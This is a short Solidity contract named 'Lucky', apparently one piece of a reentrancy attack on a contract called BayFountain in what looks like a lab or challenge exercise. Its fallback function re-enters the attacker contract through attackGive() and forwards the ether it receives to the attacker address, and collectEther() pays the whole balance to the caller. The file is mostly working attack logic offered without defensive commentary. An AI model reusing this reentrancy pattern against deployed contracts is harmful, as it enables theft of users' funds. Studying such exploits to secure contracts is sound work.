pragma solidity >=0.7.0 <0.8.0;

import "BayFountain.sol";
import "Attacker.sol";

contract Lucky {
    
    Attacker attacker;
    BayFountain bayfountain;
    

    
    function connect(address payable _attacker) public 
    {
        attacker = Attacker(_attacker);
    }
    
  
    function collectEther() public 
    {
        msg.sender.transfer(address(this).balance);
    }
    
    fallback () external payable 
    {
        
        attacker.attackGive();
        if(address(bayfountain).balance != 0)
        {
            address(attacker).transfer(address(this).balance);
        }
        
    }
    
   function getBalance() public view returns(uint){
        return address(this).balance;
    }
}